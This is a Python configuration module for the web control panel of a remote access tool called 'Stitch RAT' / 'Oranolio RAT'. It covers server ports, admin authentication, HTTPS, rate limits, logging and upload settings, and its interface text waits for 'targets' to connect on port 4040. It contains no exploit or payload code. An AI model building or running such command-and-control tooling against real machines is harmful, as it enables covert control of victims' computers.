#!/usr/bin/env python3
"""
Stitch RAT Web Interface - Configuration Module
Centralized configuration with environment variable support and defaults
"""
import os
import secrets
import json
from pathlib import Path
from datetime import timedelta

class Config:
    """Configuration class for Stitch Web Interface"""
    
    # ============================================================================
    # Core Application Settings
    # ============================================================================
    APP_NAME = "Oranolio RAT"
    APP_VERSION = "1.1.0"
    
    # Base directories
    BASE_DIR = Path(__file__).parent
    APPLICATION_DIR = BASE_DIR / "Application"
    LOGS_DIR = BASE_DIR / "Logs"
    TEMP_DIR = BASE_DIR / "Temp"
    UPLOADS_DIR = BASE_DIR / "Uploads"
    DOWNLOADS_DIR = BASE_DIR / "Downloads"
    
    # Server Configuration
    HOST = os.getenv('STITCH_HOST', '0.0.0.0')
    PORT = int(os.getenv('STITCH_PORT', '5000'))
    DEBUG = os.getenv('STITCH_DEBUG', 'false').lower() in ('true', '1', 'yes')
    STITCH_SERVER_PORT = int(os.getenv('STITCH_SERVER_PORT', '4040'))
    
    # ============================================================================
    # Security Configuration
    # ============================================================================
    
    # Session Secret Key Management
    SECRET_KEY_FILE = APPLICATION_DIR / '.secret_key'
    
    @classmethod
    def ensure_secret_key(cls):
        """Ensure a persistent secret key exists"""
        # First check environment variable
        secret_key = os.getenv('STITCH_SECRET_KEY')
        if secret_key:
            return secret_key
        
        # Check for existing secret key file
        if cls.SECRET_KEY_FILE.exists():
            try:
                with open(cls.SECRET_KEY_FILE, 'r') as f:
                    secret_key = f.read().strip()
                    if secret_key:
                        return secret_key
            except Exception as e:
                print(f"⚠️  Warning: Could not read secret key file: {e}")
        
        # Generate new persistent secret key
        secret_key = secrets.token_hex(32)
        try:
            # Ensure Application directory exists
            cls.APPLICATION_DIR.mkdir(parents=True, exist_ok=True)
            
            # Save to file with restricted permissions
            with open(cls.SECRET_KEY_FILE, 'w') as f:
                f.write(secret_key)
            
            # Set file permissions (Unix/Linux only)
            try:
                os.chmod(cls.SECRET_KEY_FILE, 0o600)
            except Exception:
                pass  # Windows doesn't support chmod
            
            print(f"✓ Generated persistent secret key: {cls.SECRET_KEY_FILE}")
            print("  Sessions will persist across server restarts")
        except Exception as e:
            print(f"⚠️  Could not save secret key to file: {e}")
            print("  Sessions will be lost on server restart")
        
        return secret_key
    
    # Get persistent secret key (invoke after class body via placeholder)
    SECRET_KEY = None
    
    # Session Configuration
    SESSION_COOKIE_HTTPONLY = True
    SESSION_COOKIE_SAMESITE = 'Lax'
    SESSION_TIMEOUT_MINUTES = int(os.getenv('STITCH_SESSION_TIMEOUT', '30'))
    PERMANENT_SESSION_LIFETIME = timedelta(minutes=SESSION_TIMEOUT_MINUTES)
    
    # HTTPS Configuration
    ENABLE_HTTPS = os.getenv('STITCH_ENABLE_HTTPS', 'false').lower() in ('true', '1', 'yes')
    SESSION_COOKIE_SECURE = ENABLE_HTTPS
    WTF_CSRF_SSL_STRICT = ENABLE_HTTPS
    
    # SSL Certificate Configuration
    SSL_CERT_DIR = os.getenv('STITCH_SSL_CERT_DIR', 'certs')
    SSL_CERT = os.getenv('STITCH_SSL_CERT')
    SSL_KEY = os.getenv('STITCH_SSL_KEY')
    SSL_AUTO_GENERATE = os.getenv('STITCH_SSL_AUTO_GENERATE', 'true').lower() in ('true', '1', 'yes')
    
    # Certificate generation parameters
    SSL_COUNTRY = os.getenv('STITCH_SSL_COUNTRY', 'US')
    SSL_STATE = os.getenv('STITCH_SSL_STATE', 'State')
    SSL_CITY = os.getenv('STITCH_SSL_CITY', 'City')
    SSL_ORG = os.getenv('STITCH_SSL_ORG', 'Web Services')
    SSL_CN = os.getenv('STITCH_SSL_CN', 'localhost')
    
    # Authentication
    ADMIN_USER = os.getenv('STITCH_ADMIN_USER')
    ADMIN_PASSWORD = os.getenv('STITCH_ADMIN_PASSWORD')
    REQUIRE_STRONG_PASSWORD = os.getenv('STITCH_REQUIRE_STRONG_PASSWORD', 'true').lower() in ('true', '1', 'yes')
    MIN_PASSWORD_LENGTH = int(os.getenv('STITCH_MIN_PASSWORD_LENGTH', '12'))
    
    # API Key Configuration
    ENABLE_API_KEYS = os.getenv('STITCH_ENABLE_API_KEYS', 'false').lower() in ('true', '1', 'yes')
    API_KEYS_FILE = APPLICATION_DIR / '.api_keys.json'
    API_KEY_HEADER = os.getenv('STITCH_API_KEY_HEADER', 'X-API-Key')
    
    # Failed Login Alerts
    ENABLE_FAILED_LOGIN_ALERTS = os.getenv('STITCH_ENABLE_FAILED_LOGIN_ALERTS', 'false').lower() in ('true', '1', 'yes')
    FAILED_LOGIN_THRESHOLD = int(os.getenv('STITCH_FAILED_LOGIN_THRESHOLD', '3'))
    ALERT_EMAIL = os.getenv('STITCH_ALERT_EMAIL')
    ALERT_WEBHOOK_URL = os.getenv('STITCH_ALERT_WEBHOOK_URL')
    SMTP_HOST = os.getenv('STITCH_SMTP_HOST', 'localhost')
    SMTP_PORT = int(os.getenv('STITCH_SMTP_PORT', '587'))
    SMTP_USER = os.getenv('STITCH_SMTP_USER')
    SMTP_PASSWORD = os.getenv('STITCH_SMTP_PASSWORD')
    SMTP_USE_TLS = os.getenv('STITCH_SMTP_USE_TLS', 'true').lower() in ('true', '1', 'yes')
    
    # ============================================================================
    # Rate Limiting Configuration
    # ============================================================================
    MAX_LOGIN_ATTEMPTS = int(os.getenv('STITCH_MAX_LOGIN_ATTEMPTS', '5'))
    LOGIN_LOCKOUT_MINUTES = int(os.getenv('STITCH_LOGIN_LOCKOUT_MINUTES', '15'))
    COMMANDS_PER_MINUTE = int(os.getenv('STITCH_COMMANDS_PER_MINUTE', '30'))
    EXECUTIONS_PER_MINUTE = int(os.getenv('STITCH_EXECUTIONS_PER_MINUTE', '60'))
    API_POLLING_PER_HOUR = int(os.getenv('STITCH_API_POLLING_PER_HOUR', '1000'))
    DEFAULT_RATE_LIMIT_DAY = int(os.getenv('STITCH_DEFAULT_RATE_LIMIT_DAY', '200'))
    DEFAULT_RATE_LIMIT_HOUR = int(os.getenv('STITCH_DEFAULT_RATE_LIMIT_HOUR', '50'))
    
    # ============================================================================
    # WebSocket Configuration
    # ============================================================================
    WEBSOCKET_UPDATE_INTERVAL = int(os.getenv('STITCH_WEBSOCKET_UPDATE_INTERVAL', '5'))
    WEBSOCKET_PING_TIMEOUT = int(os.getenv('STITCH_WEBSOCKET_PING_TIMEOUT', '10'))
    WEBSOCKET_PING_INTERVAL = int(os.getenv('STITCH_WEBSOCKET_PING_INTERVAL', '25'))
    
    # ============================================================================
    # Content Security Policy
    # ============================================================================
    CSP_ENABLED = os.getenv('STITCH_CSP_ENABLED', 'true').lower() in ('true', '1', 'yes')
    CSP_REPORT_URI = os.getenv('STITCH_CSP_REPORT_URI')
    CSP_REPORT_ONLY = os.getenv('STITCH_CSP_REPORT_ONLY', 'false').lower() in ('true', '1', 'yes')
    
    @classmethod
    def get_csp_policy(cls, nonce=None):
        """Generate Content Security Policy with optional nonce"""
        policy_parts = [
            "default-src 'self'",
            f"script-src 'self' {'nonce-' + nonce if nonce else ''} https://cdn.socket.io",
            "style-src 'self' 'unsafe-inline'",  # Allow inline styles for now
            "img-src 'self' data:",
            "connect-src 'self' ws: wss:",  # WebSocket support
            "font-src 'self'",
            "object-src 'none'",
            "base-uri 'self'",
            "frame-ancestors 'none'",
            "upgrade-insecure-requests" if cls.ENABLE_HTTPS else "",
        ]
        
        if cls.CSP_REPORT_URI:
            policy_parts.append(f"report-uri {cls.CSP_REPORT_URI}")
        
        return "; ".join(filter(None, policy_parts))
    
    # ============================================================================
    # CORS Configuration
    # ============================================================================
    ALLOWED_ORIGINS = os.getenv('STITCH_ALLOWED_ORIGINS', '')
    
    @classmethod
    def get_cors_origins(cls):
        """Get CORS allowed origins from environment"""
        if not cls.ALLOWED_ORIGINS:
            # Default to localhost variations for development
            return [
                'http://localhost:5000',
                'http://127.0.0.1:5000',
                'https://localhost:5000',
                'https://127.0.0.1:5000'
            ]
        
        origins = [origin.strip() for origin in cls.ALLOWED_ORIGINS.split(',') if origin.strip()]
        
        # Security: Reject wildcard
        if '*' in origins:
            raise ValueError("SECURITY ERROR: Wildcard CORS origin '*' is NOT ALLOWED")
        
        return origins
    
    # ============================================================================
    # Logging Configuration
    # ============================================================================
    LOG_LEVEL = os.getenv('STITCH_LOG_LEVEL', 'INFO')
    LOG_FORMAT = os.getenv('STITCH_LOG_FORMAT', 
                          '%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    LOG_DATE_FORMAT = os.getenv('STITCH_LOG_DATE_FORMAT', '%Y-%m-%d %H:%M:%S')
    
    # File logging
    ENABLE_FILE_LOGGING = os.getenv('STITCH_ENABLE_FILE_LOGGING', 'true').lower() in ('true', '1', 'yes')
    LOG_FILE = LOGS_DIR / 'stitch_web.log'
    LOG_MAX_BYTES = int(os.getenv('STITCH_LOG_MAX_BYTES', str(10 * 1024 * 1024)))  # 10MB
    LOG_BACKUP_COUNT = int(os.getenv('STITCH_LOG_BACKUP_COUNT', '10'))
    LOG_RETENTION_DAYS = int(os.getenv('STITCH_LOG_RETENTION_DAYS', '30'))
    
    # Syslog
    ENABLE_SYSLOG = os.getenv('STITCH_ENABLE_SYSLOG', 'false').lower() in ('true', '1', 'yes')
    SYSLOG_HOST = os.getenv('STITCH_SYSLOG_HOST', 'localhost')
    SYSLOG_PORT = int(os.getenv('STITCH_SYSLOG_PORT', '514'))
    SYSLOG_FACILITY = os.getenv('STITCH_SYSLOG_FACILITY', 'USER')
    
    # ============================================================================
    # Storage Configuration
    # ============================================================================
    ENABLE_SQLITE = os.getenv('STITCH_ENABLE_SQLITE', 'false').lower() in ('true', '1', 'yes')
    SQLITE_DB_FILE = APPLICATION_DIR / 'stitch.db'
    
    # ============================================================================
    # Connection Management
    # ============================================================================
    MAX_CONNECTIONS = int(os.getenv('STITCH_MAX_CONNECTIONS', '100'))
    CONNECTION_TIMEOUT_SECONDS = int(os.getenv('STITCH_CONNECTION_TIMEOUT_SECONDS', '300'))
    HEARTBEAT_INTERVAL_SECONDS = int(os.getenv('STITCH_HEARTBEAT_INTERVAL_SECONDS', '30'))
    STALE_CONNECTION_THRESHOLD = int(os.getenv('STITCH_STALE_CONNECTION_THRESHOLD', '600'))
    
    # ============================================================================
    # UI/UX Configuration
    # ============================================================================
    PAGINATION_DEFAULT = int(os.getenv('STITCH_PAGINATION_DEFAULT', '25'))
    PAGINATION_OPTIONS = [10, 25, 50, 100]
    
    # Empty state messages
    EMPTY_STATE_CONNECTIONS = "Waiting for targets to connect..."
    EMPTY_STATE_CONNECTIONS_HINT = "Targets should connect to port 4040"
    EMPTY_STATE_FILES = "No files available"
    EMPTY_STATE_LOGS = "No logs to display"
    
    # ============================================================================
    # Operational Configuration
    # ============================================================================
    ENABLE_METRICS = os.getenv('STITCH_ENABLE_METRICS', 'false').lower() in ('true', '1', 'yes')
    METRICS_AUTH_REQUIRED = os.getenv('STITCH_METRICS_AUTH_REQUIRED', 'true').lower() in ('true', '1', 'yes')
    
    ENABLE_BACKUP_RESTORE = os.getenv('STITCH_ENABLE_BACKUP_RESTORE', 'true').lower() in ('true', '1', 'yes')
    BACKUP_INCLUDE_LOGS = os.getenv('STITCH_BACKUP_INCLUDE_LOGS', 'false').lower() in ('true', '1', 'yes')
    
    # ============================================================================
    # History and Limits
    # ============================================================================
    MAX_DEBUG_LOGS = int(os.getenv('STITCH_MAX_DEBUG_LOGS', '1000'))
    MAX_COMMAND_HISTORY = int(os.getenv('STITCH_MAX_COMMAND_HISTORY', '1000'))
    DEFAULT_LOG_FETCH_LIMIT = int(os.getenv('STITCH_DEFAULT_LOG_FETCH_LIMIT', '100'))
    DEFAULT_HISTORY_FETCH_LIMIT = int(os.getenv('STITCH_DEFAULT_HISTORY_FETCH_LIMIT', '50'))
    
    # Upload limits
    MAX_UPLOAD_SIZE = int(os.getenv('STITCH_MAX_UPLOAD_SIZE', str(100 * 1024 * 1024)))  # 100MB
    ALLOWED_UPLOAD_EXTENSIONS = os.getenv('STITCH_ALLOWED_UPLOAD_EXTENSIONS', 
                                         '.txt,.pdf,.doc,.docx,.xls,.xlsx,.png,.jpg,.jpeg,.gif,.zip,.tar,.gz')
    
    # ============================================================================
    # Helper Methods
    # ============================================================================
    
    @classmethod
    def to_dict(cls):
        """Export configuration as dictionary"""
        config_dict = {}
        for attr in dir(cls):
            if not attr.startswith('_') and attr.isupper():
                value = getattr(cls, attr)
                if not callable(value):
                    # Convert Path objects to strings
                    if isinstance(value, Path):
                        value = str(value)
                    config_dict[attr] = value
        return config_dict
    
    @classmethod
    def get_public_config(cls):
        """Get configuration safe to expose to frontend"""
        return {
            'APP_NAME': cls.APP_NAME,
            'APP_VERSION': cls.APP_VERSION,
            'WEBSOCKET_UPDATE_INTERVAL': cls.WEBSOCKET_UPDATE_INTERVAL,
            'PAGINATION_DEFAULT': cls.PAGINATION_DEFAULT,
            'PAGINATION_OPTIONS': cls.PAGINATION_OPTIONS,
            'MAX_UPLOAD_SIZE': cls.MAX_UPLOAD_SIZE,
            'ALLOWED_UPLOAD_EXTENSIONS': cls.ALLOWED_UPLOAD_EXTENSIONS,
            'EMPTY_STATE_CONNECTIONS': cls.EMPTY_STATE_CONNECTIONS,
            'EMPTY_STATE_CONNECTIONS_HINT': cls.EMPTY_STATE_CONNECTIONS_HINT,
            'EMPTY_STATE_FILES': cls.EMPTY_STATE_FILES,
            'EMPTY_STATE_LOGS': cls.EMPTY_STATE_LOGS,
            'ENABLE_API_KEYS': cls.ENABLE_API_KEYS,
            'ENABLE_BACKUP_RESTORE': cls.ENABLE_BACKUP_RESTORE,
            'ENABLE_METRICS': cls.ENABLE_METRICS,
            'HTTPS_ENABLED': cls.ENABLE_HTTPS,
        }
    
    @classmethod
    def reload(cls):
        """Reload configuration from environment (for runtime updates)"""
        # Re-read all environment variables
        for attr in dir(cls):
            if attr.startswith('_') or not attr.isupper():
                continue
            
            env_key = f'STITCH_{attr}'
            env_value = os.getenv(env_key)
            
            if env_value is not None:
                current_value = getattr(cls, attr)
                
                # Type conversion based on current value
                if isinstance(current_value, bool):
                    new_value = env_value.lower() in ('true', '1', 'yes')
                elif isinstance(current_value, int):
                    try:
                        new_value = int(env_value)
                    except ValueError:
                        continue
                elif isinstance(current_value, Path):
                    new_value = Path(env_value)
                else:
                    new_value = env_value
                
                setattr(cls, attr, new_value)
        
        return cls.to_dict()
    
    @classmethod
    def validate(cls):
        """Validate configuration settings"""
        errors = []
        
        # Check required authentication
        if not cls.ADMIN_USER or not cls.ADMIN_PASSWORD:
            errors.append("STITCH_ADMIN_USER and STITCH_ADMIN_PASSWORD must be set")
        
        # Check password strength
        if cls.ADMIN_PASSWORD and cls.REQUIRE_STRONG_PASSWORD:
            if len(cls.ADMIN_PASSWORD) < cls.MIN_PASSWORD_LENGTH:
                errors.append(f"Password must be at least {cls.MIN_PASSWORD_LENGTH} characters")
        
        # Check SSL configuration
        if cls.ENABLE_HTTPS:
            if not cls.SSL_AUTO_GENERATE:
                if not cls.SSL_CERT or not cls.SSL_KEY:
                    errors.append("HTTPS enabled but no certificates configured")
        
        # Check email alerts configuration
        if cls.ENABLE_FAILED_LOGIN_ALERTS:
            if cls.ALERT_EMAIL and not cls.SMTP_HOST:
                errors.append("Email alerts enabled but SMTP not configured")
        
        # Check directories exist or can be created
        for dir_attr in ['LOGS_DIR', 'TEMP_DIR', 'UPLOADS_DIR', 'DOWNLOADS_DIR']:
            dir_path = getattr(cls, dir_attr)
            try:
                dir_path.mkdir(parents=True, exist_ok=True)
            except Exception as e:
                errors.append(f"Cannot create {dir_attr}: {e}")
        
        return errors

# Initialize configuration on module load
# Resolve SECRET_KEY after class creation
Config.SECRET_KEY = Config.ensure_secret_key()
_validation_errors = Config.validate()
if _validation_errors:
    print("⚠️  Configuration warnings:")
    for error in _validation_errors:
        print(f"   - {error}")